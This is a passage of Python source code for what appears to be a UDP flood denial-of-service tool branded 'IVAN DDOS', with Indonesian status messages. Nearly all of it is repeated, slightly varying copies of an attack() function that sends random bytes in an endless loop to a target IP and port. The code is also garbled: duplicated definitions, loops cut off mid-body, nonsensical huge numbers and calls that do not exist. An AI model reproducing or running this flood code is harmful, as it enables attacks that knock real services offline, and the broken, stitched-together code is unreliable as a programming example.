    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
